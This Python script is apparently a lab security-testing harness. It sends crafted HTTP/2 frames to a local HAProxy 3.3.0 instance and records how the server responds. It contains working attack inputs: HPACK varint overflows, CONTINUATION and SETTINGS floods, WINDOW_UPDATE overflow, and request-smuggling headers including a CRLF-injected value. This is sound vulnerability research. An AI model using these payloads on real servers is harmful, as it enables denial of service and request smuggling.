#!/usr/bin/env python3
"""
Phase 3: HTTP/2 & HPACK Attack Script
Target: HAProxy v3.3.0 on 127.0.0.1:8443 (HTTPS/H2)

Tests HPACK varint overflow, CONTINUATION flood, frame-level attacks,
H2-to-H1 down[REDACTED] smuggling, SETTINGS/WINDOW_UPDATE abuse.
"""

import socket
import ssl
import struct
import time
import json
import sys
import os
import traceback

EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/HAProxy/evidence"
EVIDENCE_FILE = os.path.join(EVIDENCE_DIR, "phase3_h2_attacks.json")

HOST = "127.0.0.1"
PORT = 8443

# H2 Frame Types
H2_FRAME_DATA = 0x0
H2_FRAME_HEADERS = 0x1
H2_FRAME_PRIORITY = 0x2
H2_FRAME_RST_STREAM = 0x3
H2_FRAME_SETTINGS = 0x4
H2_FRAME_PUSH_PROMISE = 0x5
H2_FRAME_PING = 0x6
H2_FRAME_GOAWAY = 0x7
H2_FRAME_WINDOW_UPDATE = 0x8
H2_FRAME_CONTINUATION = 0x9

# H2 Flags
H2_FLAG_END_STREAM = 0x1
H2_FLAG_END_HEADERS = 0x4
H2_FLAG_PADDED = 0x8
H2_FLAG_PRIORITY = 0x20

# H2 Settings
H2_SETTINGS_HEADER_TABLE_SIZE = 0x1
H2_SETTINGS_ENABLE_PUSH = 0x2
H2_SETTINGS_MAX_CONCURRENT_STREAMS = 0x3
H2_SETTINGS_INITIAL_WINDOW_SIZE = 0x4
H2_SETTINGS_MAX_FRAME_SIZE = 0x5
H2_SETTINGS_MAX_HEADER_LIST_SIZE = 0x6

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

class EvidenceCollector:
    def __init__(self):
        self.findings = []
        self.tests = []
        self.test_count = 0
        self.anomaly_count = 0
        self.finding_count = 0

    def add_test(self, category, name, result, details="", severity=None):
        self.test_count += 1
        entry = {
            "id": self.test_count,
            "category": category,
            "name": name,
            "result": result,
            "details": details,
            "timestamp": time.time()
        }
        if severity:
            entry["severity"] = severity
        self.tests.append(entry)
        if result == "ANOMALY":
            self.anomaly_count += 1
        elif result in ("VULNERABLE", "FINDING"):
            self.finding_count += 1
            self.findings.append(entry)
        status = f"[{result}]"
        sev = f" ({severity})" if severity else ""
        print(f"  {status:14s} {category}/{name}{sev}")
        if details and result in ("VULNERABLE", "FINDING", "ANOMALY"):
            for line in str(details).split("\n")[:3]:
                print(f"               {line}")

    def save(self):
        data = {
            "phase": "Phase 3: HTTP/2 & HPACK Attacks",
            "target": "HAProxy v3.3.0",
            "timestamp": time.time(),
            "summary": {
                "total_tests": self.test_count,
                "anomalies": self.anomaly_count,
                "findings": self.finding_count
            },
            "findings": self.findings,
            "tests": self.tests
        }
        with open(EVIDENCE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"\n[*] Evidence saved: {EVIDENCE_FILE}")
        print(f"    Tests: {self.test_count} | Anomalies: {self.anomaly_count} | Findings: {self.finding_count}")

evidence = EvidenceCollector()

# --- H2 helpers ---

def build_frame(frame_type, flags, stream_id, payload):
    """Build an HTTP/2 frame."""
    length = len(payload)
    header = struct.pack(">I", length)[1:]  # 3-byte length
    header += struct.pack(">B", frame_type)
    header += struct.pack(">B", flags)
    header += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return header + payload

def build_settings_frame(settings=None, ack=False):
    """Build SETTINGS frame."""
    if ack:
        return build_frame(H2_FRAME_SETTINGS, 0x1, 0, b"")
    payload = b""
    if settings:
        for k, v in settings.items():
            payload += struct.pack(">HI", k, v)
    return build_frame(H2_FRAME_SETTINGS, 0, 0, payload)

def build_window_update(stream_id, increment):
    """Build WINDOW_UPDATE frame."""
    payload = struct.pack(">I", increment & 0x7FFFFFFF)
    return build_frame(H2_FRAME_WINDOW_UPDATE, 0, stream_id, payload)

def build_ping(data=b"\x00" * 8, ack=False):
    """Build PING frame."""
    flags = 0x1 if ack else 0
    return build_frame(H2_FRAME_PING, flags, 0, data[:8].ljust(8, b"\x00"))

def build_goaway(last_stream_id, error_code, debug_data=b""):
    """Build GOAWAY frame."""
    payload = struct.pack(">II", last_stream_id, error_code) + debug_data
    return build_frame(H2_FRAME_GOAWAY, 0, 0, payload)

def build_rst_stream(stream_id, error_code):
    """Build RST_STREAM frame."""
    payload = struct.pack(">I", error_code)
    return build_frame(H2_FRAME_RST_STREAM, 0, stream_id, payload)

def hpack_encode_int(value, prefix_bits, prefix_byte=0):
    """Encode an HPACK integer with the given prefix."""
    max_prefix = (1 << prefix_bits) - 1
    if value < max_prefix:
        return bytes([prefix_byte | value])
    result = bytes([prefix_byte | max_prefix])
    value -= max_prefix
    while value >= 128:
        result += bytes([(value & 0x7F) | 0x80])
        value >>= 7
    result += bytes([value])
    return result

def hpack_encode_overlong_int(value, prefix_bits, prefix_byte=0, extra_continuation_bytes=0):
    """Encode an HPACK integer with extra continuation bytes (for overflow testing)."""
    max_prefix = (1 << prefix_bits) - 1
    result = bytes([prefix_byte | max_prefix])
    value -= max_prefix

    while value >= 128:
        result += bytes([(value & 0x7F) | 0x80])
        value >>= 7

    if extra_continuation_bytes > 0:
        # Add extra continuation bytes (all with high bit set) before the final byte
        # This creates the shift overflow condition
        for i in range(extra_continuation_bytes):
            result += bytes([0x80])  # continuation byte with value 0
        result += bytes([value])  # final byte
    else:
        result += bytes([value])

    return result

def build_simple_headers_block():
    """Build a minimal valid HPACK-encoded headers block for GET /."""
    # Use indexed header representations
    block = b""
    block += b"\x82"       # :method = GET (index 2)
    block += b"\x84"       # :path = / (index 4)
    block += b"\x86"       # :scheme = https (index 7)
    # :authority = 127.0.0.1:8443 (literal with incremental indexing)
    block += b"\x41"       # Literal with indexing, name index 1 (:authority)
    authority = b"127.0.0.1:8443"
    block += hpack_encode_int(len(authority), 7)
    block += authority
    return block

def h2_connect(host=HOST, port=PORT):
    """Establish H2 connection with TLS."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.create_connection((host, port), timeout=5)
    tls_sock = ctx.wrap_socket(sock, server_hostname=host)

    if tls_sock.selected_alpn_protocol() != "h2":
        print(f"    Warning: ALPN selected {tls_sock.selected_alpn_protocol()}")

    # Send connection preface
    tls_sock.sendall(H2_PREFACE)
    # Send initial SETTINGS
    tls_sock.sendall(build_settings_frame())
    time.sleep(0.1)

    # Read server preface + settings
    try:
        resp = tls_sock.recv(16384)
    except:
        resp = b""

    # Send SETTINGS ACK
    tls_sock.sendall(build_settings_frame(ack=True))
    time.sleep(0.1)

    return tls_sock

def h2_read_frames(sock, timeout=2, max_bytes=65536):
    """Read and return raw frames from H2 connection."""
    data = b""
    sock.settimeout(timeout)
    try:
        while len(data) < max_bytes:
            chunk = sock.recv(16384)
            if not chunk:
                break
            data += chunk
    except (socket.timeout, ssl.SSLError):
        pass
    return data

def parse_frames(data):
    """Parse raw H2 frame data into list of (type, flags, stream_id, payload)."""
    frames = []
    pos = 0
    while pos + 9 <= len(data):
        length = int.from_bytes(data[pos:pos+3], 'big')
        ftype = data[pos+3]
        flags = data[pos+4]
        stream_id = int.from_bytes(data[pos+5:pos+9], 'big') & 0x7FFFFFFF
        if pos + 9 + length > len(data):
            break
        payload = data[pos+9:pos+9+length]
        frames.append((ftype, flags, stream_id, payload))
        pos += 9 + length
    return frames

# ============================================================
# Category 1: HPACK Integer Overflow
# ============================================================
def test_hpack_varint_overflow():
    print("\n[*] Category 1: HPACK Varint Integer Overflow")

    # Test 1.1: Normal HPACK integer (baseline)
    try:
        sock = h2_connect()
        headers = build_simple_headers_block()
        frame = build_frame(H2_FRAME_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, 1, headers)
        sock.sendall(frame)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        has_headers = any(f[0] == H2_FRAME_HEADERS for f in frames)
        evidence.add_test("HPACK-Varint", "baseline_request", "SAFE" if has_headers else "ANOMALY",
                         f"Baseline H2 request: {'success' if has_headers else 'no response'}")
        sock.close()
    except Exception as e:
        evidence.add_test("HPACK-Varint", "baseline_request", "ERROR", str(e))

    # Test 1.2: HPACK varint with many continuation bytes (shift overflow)
    # The value field in HPACK uses 7-bit prefix. After 5+ continuation bytes,
    # shift reaches 35+ which is UB for uint32_t
    for num_extra in [5, 8, 10, 15, 20, 30]:
        try:
            sock = h2_connect()

            # Craft a HEADERS block with an overlong varint in the header name length
            # Literal header field with indexing, new name
            # Format: 0x40 (literal with indexing, new name)
            # Then name length (varint with 7-bit prefix)
            block = b""
            block += b"\x82"  # :method = GET
            block += b"\x84"  # :path = /
            block += b"\x86"  # :scheme = https
            block += b"\x41"  # :authority with indexing
            authority = b"127.0.0.1:8443"
            block += hpack_encode_int(len(authority), 7)
            block += authority

            # Add a header with overlong varint encoding for value length
            block += b"\x40"  # Literal with indexing, new name
            name = b"x-test"
            block += hpack_encode_int(len(name), 7)
            block += name

            # Value length encoded with extra continuation bytes
            # Encode "5" but with extra continuation bytes that push shift past 32
            value = b"hello"
            overlong = hpack_encode_overlong_int(len(value), 7, 0, num_extra)
            block += overlong
            block += value

            frame = build_frame(H2_FRAME_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, 1, block)
            sock.sendall(frame)
            time.sleep(0.3)
            resp = h2_read_frames(sock)
            frames = parse_frames(resp)

            # Check for GOAWAY (error) or response (accepted)
            goaway_frames = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
            rst_frames = [f for f in frames if f[0] == H2_FRAME_RST_STREAM]
            header_frames = [f for f in frames if f[0] == H2_FRAME_HEADERS]

            if goaway_frames:
                error_code = struct.unpack(">I", goaway_frames[0][3][4:8])[0] if len(goaway_frames[0][3]) >= 8 else -1
                evidence.add_test("HPACK-Varint", f"overlong_varint({num_extra}_extra)",
                                 "SAFE", f"GOAWAY error_code={error_code}")
            elif rst_frames:
                evidence.add_test("HPACK-Varint", f"overlong_varint({num_extra}_extra)",
                                 "SAFE", "RST_STREAM received")
            elif header_frames:
                evidence.add_test("HPACK-Varint", f"overlong_varint({num_extra}_extra)",
                                 "ANOMALY", f"Request with {num_extra} extra continuation bytes ACCEPTED",
                                 "MEDIUM")
            else:
                evidence.add_test("HPACK-Varint", f"overlong_varint({num_extra}_extra)",
                                 "ANOMALY", f"No response or unexpected frames: {len(frames)} frames",
                                 "LOW")
            sock.close()
        except Exception as e:
            evidence.add_test("HPACK-Varint", f"overlong_varint({num_extra}_extra)",
                             "ERROR", str(e))

    # Test 1.3: HPACK index with overlong varint (static table OOB attempt)
    for target_index in [62, 100, 255, 1000, 0xFFFFFFFF]:
        try:
            sock = h2_connect()
            block = b""
            # Indexed header field (1-bit prefix = 1, 7-bit index)
            block += hpack_encode_int(target_index, 7, 0x80)
            frame = build_frame(H2_FRAME_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, 1, block)
            sock.sendall(frame)
            time.sleep(0.3)
            resp = h2_read_frames(sock)
            frames = parse_frames(resp)
            goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
            if goaway:
                evidence.add_test("HPACK-Varint", f"oob_index({target_index})", "SAFE",
                                 "GOAWAY — invalid index rejected")
            else:
                evidence.add_test("HPACK-Varint", f"oob_index({target_index})", "ANOMALY",
                                 f"OOB index {target_index} not rejected!", "HIGH")
            sock.close()
        except Exception as e:
            evidence.add_test("HPACK-Varint", f"oob_index({target_index})", "ERROR", str(e))

# ============================================================
# Category 2: CONTINUATION Flood
# ============================================================
def test_continuation_flood():
    print("\n[*] Category 2: CONTINUATION Flood (CVE-2024-27316 pattern)")

    # Test 2.1: Many small CONTINUATION frames
    for num_cont in [10, 50, 100, 500]:
        try:
            sock = h2_connect()

            # Send HEADERS without END_HEADERS
            headers_block = build_simple_headers_block()
            # Split: first byte in HEADERS, rest in CONTINUATION frames
            initial = headers_block[:1]
            remaining = headers_block[1:]

            frame = build_frame(H2_FRAME_HEADERS, 0, 1, initial)  # No END_HEADERS
            sock.sendall(frame)

            # Send many tiny CONTINUATION frames
            for i in range(num_cont - 1):
                cont = build_frame(H2_FRAME_CONTINUATION, 0, 1, b"\x00")  # 1-byte payload
                sock.sendall(cont)

            # Final CONTINUATION with END_HEADERS and remaining data
            final_cont = build_frame(H2_FRAME_CONTINUATION, H2_FLAG_END_HEADERS, 1, remaining)
            sock.sendall(final_cont)
            time.sleep(0.5)

            resp = h2_read_frames(sock)
            frames = parse_frames(resp)
            goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
            if goaway:
                error_code = struct.unpack(">I", goaway[0][3][4:8])[0] if len(goaway[0][3]) >= 8 else -1
                evidence.add_test("CONT-Flood", f"small_fragments({num_cont})",
                                 "SAFE", f"GOAWAY error={error_code} — flood detected")
            else:
                evidence.add_test("CONT-Flood", f"small_fragments({num_cont})",
                                 "ANOMALY", f"{num_cont} CONTINUATION frames accepted (glitch threshold may be 0)",
                                 "LOW")
            sock.close()
        except Exception as e:
            evidence.add_test("CONT-Flood", f"small_fragments({num_cont})", "ERROR", str(e))

    # Test 2.2: CONTINUATION with zero-length payload
    try:
        sock = h2_connect()
        headers_block = build_simple_headers_block()
        frame = build_frame(H2_FRAME_HEADERS, 0, 1, headers_block[:1])
        sock.sendall(frame)
        # Send 20 empty CONTINUATION frames
        for i in range(20):
            cont = build_frame(H2_FRAME_CONTINUATION, 0, 1, b"")
            sock.sendall(cont)
        # Final with END_HEADERS
        final = build_frame(H2_FRAME_CONTINUATION, H2_FLAG_END_HEADERS, 1, headers_block[1:])
        sock.sendall(final)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("CONT-Flood", "zero_length_cont",
                         "SAFE" if goaway else "ANOMALY",
                         "Zero-length CONTINUATION frames: " + ("rejected" if goaway else "accepted"))
        sock.close()
    except Exception as e:
        evidence.add_test("CONT-Flood", "zero_length_cont", "ERROR", str(e))

# ============================================================
# Category 3: SETTINGS & WINDOW_UPDATE Abuse
# ============================================================
def test_settings_abuse():
    print("\n[*] Category 3: SETTINGS & WINDOW_UPDATE Abuse")

    # Test 3.1: Rapid SETTINGS flood
    try:
        sock = h2_connect()
        start = time.time()
        for i in range(1000):
            settings = build_settings_frame({H2_SETTINGS_HEADER_TABLE_SIZE: 4096})
            sock.sendall(settings)
        elapsed = time.time() - start
        time.sleep(1)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        settings_ack = [f for f in frames if f[0] == H2_FRAME_SETTINGS and f[1] & 0x1]
        evidence.add_test("Settings", f"rapid_settings(1000)",
                         "ANOMALY" if not goaway else "SAFE",
                         f"1000 SETTINGS in {elapsed:.2f}s: {len(settings_ack)} ACKs, {'GOAWAY' if goaway else 'no GOAWAY'}")
        sock.close()
    except Exception as e:
        evidence.add_test("Settings", "rapid_settings(1000)", "ERROR", str(e))

    # Test 3.2: Invalid SETTINGS parameters
    invalid_settings = [
        ({H2_SETTINGS_ENABLE_PUSH: 2}, "enable_push=2"),
        ({H2_SETTINGS_MAX_FRAME_SIZE: 0}, "max_frame=0"),
        ({H2_SETTINGS_MAX_FRAME_SIZE: 0xFFFFFF + 1}, "max_frame=16MB+1"),
        ({H2_SETTINGS_INITIAL_WINDOW_SIZE: 0x80000000}, "window=2^31"),
        ({0xFF: 1234}, "unknown_setting_0xFF"),
    ]
    for settings, label in invalid_settings:
        try:
            sock = h2_connect()
            frame = build_settings_frame(settings)
            sock.sendall(frame)
            time.sleep(0.5)
            resp = h2_read_frames(sock)
            frames = parse_frames(resp)
            goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
            evidence.add_test("Settings", f"invalid_{label}",
                             "SAFE" if goaway else "ANOMALY",
                             f"{'GOAWAY' if goaway else 'Accepted'}")
            sock.close()
        except Exception as e:
            evidence.add_test("Settings", f"invalid_{label}", "ERROR", str(e))

    # Test 3.3: WINDOW_UPDATE with increment=0 (must be error)
    try:
        sock = h2_connect()
        frame = build_window_update(0, 0)  # connection-level, increment=0
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("Settings", "window_update_zero",
                         "SAFE" if goaway else "ANOMALY",
                         f"WINDOW_UPDATE(0): {'GOAWAY' if goaway else 'Accepted'}")
        sock.close()
    except Exception as e:
        evidence.add_test("Settings", "window_update_zero", "ERROR", str(e))

    # Test 3.4: WINDOW_UPDATE with max increment (2^31-1)
    try:
        sock = h2_connect()
        frame = build_window_update(0, 0x7FFFFFFF)
        sock.sendall(frame)
        time.sleep(0.3)
        # Send another to trigger overflow
        frame = build_window_update(0, 0x7FFFFFFF)
        sock.sendall(frame)
        time.sleep(0.5)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("Settings", "window_update_overflow",
                         "SAFE" if goaway else "ANOMALY",
                         f"Double max WINDOW_UPDATE: {'GOAWAY (overflow detected)' if goaway else 'Accepted'}")
        sock.close()
    except Exception as e:
        evidence.add_test("Settings", "window_update_overflow", "ERROR", str(e))

# ============================================================
# Category 4: Frame-Level Attacks
# ============================================================
def test_frame_attacks():
    print("\n[*] Category 4: Frame-Level Attacks")

    # Test 4.1: Invalid frame type
    try:
        sock = h2_connect()
        frame = build_frame(0xFF, 0, 0, b"\x00" * 8)  # Unknown frame type
        sock.sendall(frame)
        time.sleep(0.3)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("Frame", "unknown_frame_type_0xFF",
                         "SAFE", f"Unknown frame type: {'GOAWAY' if goaway else 'Ignored (correct per RFC)'}")
        sock.close()
    except Exception as e:
        evidence.add_test("Frame", "unknown_frame_type_0xFF", "ERROR", str(e))

    # Test 4.2: PRIORITY frame with self-dependency
    try:
        sock = h2_connect()
        # PRIORITY: stream depends on itself
        payload = struct.pack(">IB", 1, 16)  # depends on stream 1, weight 16
        frame = build_frame(H2_FRAME_PRIORITY, 0, 1, payload)
        sock.sendall(frame)
        time.sleep(0.3)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        evidence.add_test("Frame", "priority_self_dependency",
                         "SAFE", "Self-dependency handled")
        sock.close()
    except Exception as e:
        evidence.add_test("Frame", "priority_self_dependency", "ERROR", str(e))

    # Test 4.3: DATA frame on stream 0 (invalid)
    try:
        sock = h2_connect()
        frame = build_frame(H2_FRAME_DATA, 0, 0, b"hello")
        sock.sendall(frame)
        time.sleep(0.3)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("Frame", "data_on_stream_0",
                         "SAFE" if goaway else "ANOMALY",
                         f"DATA on stream 0: {'GOAWAY (correct)' if goaway else 'Accepted (wrong!)'}")
        sock.close()
    except Exception as e:
        evidence.add_test("Frame", "data_on_stream_0", "ERROR", str(e))

    # Test 4.4: Oversized frame (> 16384 default max)
    try:
        sock = h2_connect()
        frame = build_frame(H2_FRAME_DATA, 0, 1, b"\x00" * 16385)
        sock.sendall(frame)
        time.sleep(0.3)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("Frame", "oversized_frame",
                         "SAFE" if goaway else "ANOMALY",
                         f"Frame > 16384: {'GOAWAY' if goaway else 'Accepted'}")
        sock.close()
    except Exception as e:
        evidence.add_test("Frame", "oversized_frame", "ERROR", str(e))

    # Test 4.5: PING with wrong length (not 8 bytes)
    try:
        sock = h2_connect()
        frame = build_frame(H2_FRAME_PING, 0, 0, b"\x00" * 7)  # 7 bytes instead of 8
        sock.sendall(frame)
        time.sleep(0.3)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("Frame", "ping_wrong_length",
                         "SAFE" if goaway else "ANOMALY",
                         f"PING with 7 bytes: {'GOAWAY' if goaway else 'Accepted'}")
        sock.close()
    except Exception as e:
        evidence.add_test("Frame", "ping_wrong_length", "ERROR", str(e))

    # Test 4.6: SETTINGS with non-multiple-of-6 length
    try:
        sock = h2_connect()
        frame = build_frame(H2_FRAME_SETTINGS, 0, 0, b"\x00" * 7)  # 7 bytes
        sock.sendall(frame)
        time.sleep(0.3)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("Frame", "settings_wrong_length",
                         "SAFE" if goaway else "ANOMALY",
                         f"SETTINGS with 7 bytes: {'GOAWAY' if goaway else 'Accepted'}")
        sock.close()
    except Exception as e:
        evidence.add_test("Frame", "settings_wrong_length", "ERROR", str(e))

# ============================================================
# Category 5: H2-to-H1 Smuggling
# ============================================================
def test_h2_h1_smuggling():
    print("\n[*] Category 5: H2-to-H1 Down[REDACTED] Smuggling")

    # Test 5.1: Transfer-Encoding header in H2 request (forbidden)
    smuggling_headers = [
        ("transfer-encoding", "chunked", "TE_chunked"),
        ("connection", "keep-alive", "Connection"),
        ("proxy-connection", "keep-alive", "Proxy-Connection"),
        ("up[REDACTED]", "websocket", "Up[REDACTED]"),
        ("keep-alive", "timeout=5", "Keep-Alive"),
    ]
    for hname, hvalue, label in smuggling_headers:
        try:
            sock = h2_connect()
            block = b""
            block += b"\x82"  # :method = GET
            block += b"\x84"  # :path = /
            block += b"\x86"  # :scheme = https
            block += b"\x41"  # :authority
            auth = b"127.0.0.1:8443"
            block += hpack_encode_int(len(auth), 7)
            block += auth
            # Forbidden header (literal without indexing)
            block += b"\x00"  # Literal without indexing, new name
            block += hpack_encode_int(len(hname.encode()), 7)
            block += hname.encode()
            block += hpack_encode_int(len(hvalue.encode()), 7)
            block += hvalue.encode()

            frame = build_frame(H2_FRAME_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, 1, block)
            sock.sendall(frame)
            time.sleep(0.3)
            resp = h2_read_frames(sock)
            frames = parse_frames(resp)
            goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
            rst = [f for f in frames if f[0] == H2_FRAME_RST_STREAM]
            if goaway or rst:
                evidence.add_test("H2-H1", f"forbidden_header({label})", "SAFE",
                                 f"Forbidden header {hname} rejected")
            else:
                evidence.add_test("H2-H1", f"forbidden_header({label})", "FINDING",
                                 f"Forbidden header {hname}:{hvalue} ACCEPTED in H2!", "HIGH")
            sock.close()
        except Exception as e:
            evidence.add_test("H2-H1", f"forbidden_header({label})", "ERROR", str(e))

    # Test 5.2: CRLF in H2 header value (should be forbidden)
    try:
        sock = h2_connect()
        block = b""
        block += b"\x82\x84\x86"  # method, path, scheme
        block += b"\x41"  # :authority
        auth = b"127.0.0.1:8443"
        block += hpack_encode_int(len(auth), 7)
        block += auth
        # Header with CRLF in value
        block += b"\x00"
        name = b"x-test"
        block += hpack_encode_int(len(name), 7)
        block += name
        value = b"before\r\ninjected: evil"
        block += hpack_encode_int(len(value), 7)
        block += value

        frame = build_frame(H2_FRAME_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, 1, block)
        sock.sendall(frame)
        time.sleep(0.3)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("H2-H1", "crlf_in_value",
                         "SAFE" if goaway else "FINDING",
                         f"CRLF in H2 header value: {'rejected' if goaway else 'ACCEPTED!'}")
        sock.close()
    except Exception as e:
        evidence.add_test("H2-H1", "crlf_in_value", "ERROR", str(e))

    # Test 5.3: Uppercase header name in H2 (forbidden per RFC 7540)
    try:
        sock = h2_connect()
        block = b""
        block += b"\x82\x84\x86"
        block += b"\x41"
        auth = b"127.0.0.1:8443"
        block += hpack_encode_int(len(auth), 7)
        block += auth
        block += b"\x00"
        name = b"X-Upper"  # Uppercase!
        block += hpack_encode_int(len(name), 7)
        block += name
        value = b"test"
        block += hpack_encode_int(len(value), 7)
        block += value

        frame = build_frame(H2_FRAME_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, 1, block)
        sock.sendall(frame)
        time.sleep(0.3)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        rst = [f for f in frames if f[0] == H2_FRAME_RST_STREAM]
        evidence.add_test("H2-H1", "uppercase_header_name",
                         "SAFE" if (goaway or rst) else "ANOMALY",
                         f"Uppercase header: {'rejected' if (goaway or rst) else 'accepted (RFC violation)'}")
        sock.close()
    except Exception as e:
        evidence.add_test("H2-H1", "uppercase_header_name", "ERROR", str(e))

    # Test 5.4: Null byte in H2 header value
    try:
        sock = h2_connect()
        block = b""
        block += b"\x82\x84\x86"
        block += b"\x41"
        auth = b"127.0.0.1:8443"
        block += hpack_encode_int(len(auth), 7)
        block += auth
        block += b"\x00"
        name = b"x-null"
        block += hpack_encode_int(len(name), 7)
        block += name
        value = b"before\x00after"
        block += hpack_encode_int(len(value), 7)
        block += value

        frame = build_frame(H2_FRAME_HEADERS, H2_FLAG_END_HEADERS | H2_FLAG_END_STREAM, 1, block)
        sock.sendall(frame)
        time.sleep(0.3)
        resp = h2_read_frames(sock)
        frames = parse_frames(resp)
        goaway = [f for f in frames if f[0] == H2_FRAME_GOAWAY]
        evidence.add_test("H2-H1", "null_in_value",
                         "SAFE" if goaway else "FINDING",
                         f"Null byte in H2 header: {'rejected' if goaway else 'ACCEPTED!'}")
        sock.close()
    except Exception as e:
        evidence.add_test("H2-H1", "null_in_value", "ERROR", str(e))

# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    print("=" * 70)
    print("Phase 3: HTTP/2 & HPACK Attacks")
    print(f"Target: HAProxy v3.3.0 @ {HOST}:{PORT} (HTTPS/H2)")
    print("=" * 70)

    try:
        test_hpack_varint_overflow()
        test_continuation_flood()
        test_settings_abuse()
        test_frame_attacks()
        test_h2_h1_smuggling()
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        traceback.print_exc()
    finally:
        evidence.save()
